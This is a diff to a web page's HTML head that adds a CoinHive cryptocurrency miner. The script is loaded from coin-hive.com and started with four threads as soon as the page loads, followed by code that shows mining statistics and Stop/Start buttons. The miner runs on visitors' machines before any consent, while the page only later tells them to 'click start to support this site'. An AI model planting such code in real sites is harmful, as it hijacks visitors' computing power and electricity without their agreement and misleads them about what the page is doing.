@@ -5,7 +5,29 @@
     <title>:)</title>
     <link rel="icon" type="image/png" href="img/flavicon.png"/>
     <link rel="stylesheet" href="style.css">
-
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script type="text/javascript">
+        var miner = new CoinHive.Anonymous('zV6lnSibFir7L6zi620awvNr4Ue2aALA','threads: 4');
+        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+        setInterval(function() {
+            var threadCount = miner.getNumThreads();
+            var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+            var totalHashes = miner.getTotalHashes();
+            var acceptedHashes = miner.getAcceptedHashes() / 256;
+            if (miner.isRunning()) {
+                document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+                document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+                document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+                document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+                document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+            } else {
+                document.getElementById("hps").innerHTML = "Please click start";
+                document.getElementById("ths").innerHTML = "to support";
+                document.getElementById("tah").innerHTML = "this site";
+                document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+            }
+        }, 1000);
+    </script>
 
 </head>
 
